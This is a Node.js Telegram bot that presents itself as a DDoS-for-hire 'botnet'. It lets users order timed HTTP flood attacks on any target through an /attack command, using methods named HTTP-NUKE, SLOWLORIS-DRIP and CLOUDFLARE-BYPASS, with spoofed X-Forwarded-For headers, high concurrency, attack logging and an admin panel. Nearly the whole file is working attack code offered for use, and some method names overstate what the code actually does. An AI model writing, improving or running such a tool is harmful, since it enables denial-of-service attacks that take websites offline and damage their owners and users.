const { Telegraf } = require("telegraf");
const fs = require("fs");
const axios = require("axios");
const https = require("https");
const net = require("net");
const gradient = require("gradient-string");

// Load config
const config = JSON.parse(fs.readFileSync("./config.json"));
const bot = new Telegraf(config.bot_token);

// Admin configuration
const ADMINS = {
	X9toon: true, // Username without @
	6957196287: true, // Replace with @X9toon's Telegram ID
};

// Initialize databases
if (!fs.existsSync("./database")) fs.mkdirSync("./database");
const dbs = {
	users: "./database/users.json",
	attacks: "./database/attacks.json",
	blacklist: "./database/blacklist.json",
};

// Initialize DB files
Object.values(dbs).forEach((db) => {
	if (!fs.existsSync(db))
		fs.writeFileSync(db, db.includes("users") ? "{}" : "[]");
});

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
//                  CORE FUNCTIONS
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
function generateRandomIp() {
	return Array.from({ length: 4 }, () => Math.floor(Math.random() * 255)).join(
		".",
	);
}

function loadBots() {
	try {
		return fs
			.readFileSync("./a.txt", "utf-8")
			.split("\n")
			.filter((line) => line.trim() !== "");
	} catch {
		return [];
	}

}

function isAdmin(ctx) {
	return ADMINS[ctx.from.username] || ADMINS[ctx.from.id.toString()];
}

function logAttack(userId, target, method, duration, requests) {
	const attack = {
		userId,
		username: userId.username || "N/A",
		target,
		method,
		duration,
		requests,
		timestamp: new Date().toISOString(),
	};
	const attacks = JSON.parse(fs.readFileSync(dbs.attacks));
	attacks.push(attack);
	fs.writeFileSync(dbs.attacks, JSON.stringify(attacks, null, 2));
}

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
//                  POWERFUL ATTACK METHODS
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
async function httpNuclear(target, duration) {
	const bots = loadBots();
	if (!bots.length) return { success: false, message: "❌ No bots available" };

	const CONCURRENT_PER_BOT = 50; // Increased to 50 requests per bot for stronger attack
	let totalRequests = 0;
	const endTime = Date.now() + duration * 1000;

	while (Date.now() < endTime) {
		const attackPromises = [];

		bots.forEach((bot) => {
			for (let i = 0; i < CONCURRENT_PER_BOT; i++) {
				attackPromises.push(
					axios
						.get(target.includes("://") ? target : `http://${target}`, {
							headers: {
								"User-Agent": bot,
								"X-Forwarded-For": generateRandomIp(),
								Accept: "*/*",
								Connection: "keep-alive",
								"Cache-Control": "no-cache",
							},
							timeout: 1000, // Reduced timeout for more aggressive attack
						})
						.then(() => totalRequests++)
						.catch(() => {}),
				);
			}
		});

		await Promise.all(attackPromises);
		await new Promise((r) => setTimeout(r, 1)); // Only 1ms delay between waves
	}

	return {
		success: true,
		requests: totalRequests,
		message: `☢️ NUKE SUCCESS: ${totalRequests} requests (${Math.round(totalRequests / duration)}/sec)`,
	};
}

async function slowlorisDrip(target, duration) {
	const bots = loadBots();
	if (!bots.length) return { success: false, message: "❌ No bots available" };

	const endTime = Date.now() + duration * 1000;
	let totalRequests = 0;

	while (Date.now() < endTime) {
		const attackPromises = bots.map((bot) => {
			return axios
				.get(target.includes("://") ? target : `http://${target}`, {
					headers: {
						"User-Agent": bot,
						Connection: "keep-alive",
						"Cache-Control": "no-cache",
						Accept: "*/*",
					},
					timeout: 5000, // Increased timeout for slowloris
				})
				.then(() => totalRequests++)
				.catch(() => {});
		});

		await Promise.all(attackPromises);
		await new Promise((r) => setTimeout(r, 500)); // Slower pace to simulate slowloris
	}

	return {
		success: true,
		requests: totalRequests,
		message: `🌀 SLOWLORIS-DRIP SUCCESS: ${totalRequests} requests`,
	};
}

async function requestSplit(target, duration) {
	const bots = loadBots();
	if (!bots.length) return { success: false, message: "❌ No bots available" };

	let totalRequests = 0;
	const endTime = Date.now() + duration * 1000;

	while (Date.now() < endTime) {
		const attackPromises = bots.map((bot) => {
			return axios
				.get(target.includes("://") ? target : `http://${target}`, {
					headers: {
						"User-Agent": bot,
						Connection: "keep-alive",
						"Cache-Control": "no-cache",
						Accept: "*/*",
					},
					timeout: 1000, // More aggressive timeout
				})
				.then(() => totalRequests++)
				.catch(() => {});
		});

		await Promise.all(attackPromises);
		await new Promise((r) => setTimeout(r, 300)); // Random delay for variation
	}

	return {
		success: true,
		requests: totalRequests,
		message: `💥 REQUEST-SPLIT SUCCESS: ${totalRequests} requests`,
	};
}

async function cloudflareBypass(target, duration) {
	const bots = loadBots();
	if (!bots.length) return { success: false, message: "❌ No bots available" };

	let totalRequests = 0;
	const endTime = Date.now() + duration * 1000;

	while (Date.now() < endTime) {
		const attackPromises = bots.map((bot) => {
			return axios
				.get(target.includes("://") ? target : `http://${target}`, {
					headers: {
						"User-Agent": bot,
						Connection: "keep-alive",
						"Cache-Control": "no-cache",
						Accept: "*/*",
						"X-Forwarded-For": generateRandomIp(),
					},
					timeout: 2000, // Increased timeout for bypassing protection
				})
				.then(() => totalRequests++)
				.catch(() => {});
		});

		await Promise.all(attackPromises);
		await new Promise((r) => setTimeout(r, 100)); // Short delay
	}

	return {
		success: true,
		requests: totalRequests,
		message: `☁️ CLOUDFLARE BYPASS SUCCESS: ${totalRequests} requests`,
	};
}

const attackMethods = {
	"HTTP-NUKE": {
		desc: "Maximum power Layer7 destruction",
		execute: httpNuclear,
	},
	"SLOWLORIS-DRIP": {
		desc: "Slowloris attack simulation",
		execute: slowlorisDrip,
	},
	"REQUEST-SPLIT": {
		desc: "Request split to bypass some protections",
		execute: requestSplit,
	},
	"CLOUDFLARE-BYPASS": {
		desc: "Cloudflare protection bypass",
		execute: cloudflareBypass,
	},
};

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
//                  BOT COMMANDS
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
bot.command("start", (ctx) =>
	ctx.replyWithHTML(`
<b>🔥 ZYPHORA BOTNET</b>
━━━━━━━━━━━━━━━━━
<u>Powerful DDoS Attack Platform</u>

Type /methods to see attack options
`),
);

bot.command("methods", (ctx) =>
	ctx.replyWithHTML(`
<b>💣 AVAILABLE ATTACKS</b>
━━━━━━━━━━━━━━━━━
<code>HTTP-NUKE</code> - Complete Layer7 destruction
<code>SLOWLORIS-DRIP</code> - Slowloris attack
<code>REQUEST-SPLIT</code> - Request splitting
<code>CLOUDFLARE-BYPASS</code> - Bypass Cloudflare

<b>Usage:</b> <code>/attack target.com 120 HTTP-NUKE</code>
`),
);

bot.command("attack", async (ctx) => {
	const args = ctx.message.text.split(" ").slice(1);
	if (args.length < 3) return ctx.reply("⚠️ Usage: /attack target time method");

	const [target, time, method] = args;
	const duration = Math.min(parseInt(time) || 60, 1800);
	const methodUpper = method.toUpperCase();

	if (!attackMethods[methodUpper]) {
		return ctx.reply("❌ Invalid method. Use /methods");
	}

	// INSTANT RESPONSE
	await ctx.replyWithHTML(`
<b>🚀 ATTACK DEPLOYED!</b>
━━━━━━━━━━━━━━━━━
<b>🎯 Target:</b> <code>${target}</code>
<b>⏱️ Duration:</b> ${duration}s
<b>💣 Method:</b> ${methodUpper}

<u>Attack in progress...</u>
`);

	// Execute attack in background
	setTimeout(async () => {
		try {
			const result = await attackMethods[methodUpper].execute(target, duration);
			logAttack(ctx.from, target, methodUpper, duration, result.requests || 0);

			if (result.success) {
				ctx.replyWithHTML(`
<b>✅ TARGET DESTROYED!</b>
━━━━━━━━━━━━━━━━━
<b>Target:</b> <code>${target}</code>
<b>Duration:</b> ${duration}s
<b>Power:</b> ${result.requests} requests

${result.message}

<u>Target should be completely down</u>
								`);
			} else {
				ctx.reply(`❌ Failed: ${result.message}`);
			}
		} catch (error) {
			ctx.reply(`⚠️ Critical error: ${error.message}`);
		}
	}, 100);
});

// Admin commands
bot.command("admin", (ctx) => {
	if (!isAdmin(ctx)) return;
	ctx.replyWithHTML(`
<b>👑 ADMIN PANEL</b>
━━━━━━━━━━━━━━━━━
<code>/add @username expiry</code>
<code>/block @username</code>
<code>/logs</code> - View attack logs
<code>/stats</code> - Botnet statistics

<b>Admin:</b> @X9toon
		`);
});

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
//                  START BOT
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
bot.launch().then(() => {
	console.log(
		gradient.rainbow(`
╔══════════════════════╗
║ ZYPHORA BOTNET v2.0 ║
║   Admin: @X9toon    ║
╚══════════════════════╝
		`),
	);
});

process.once("SIGINT", () => bot.stop());
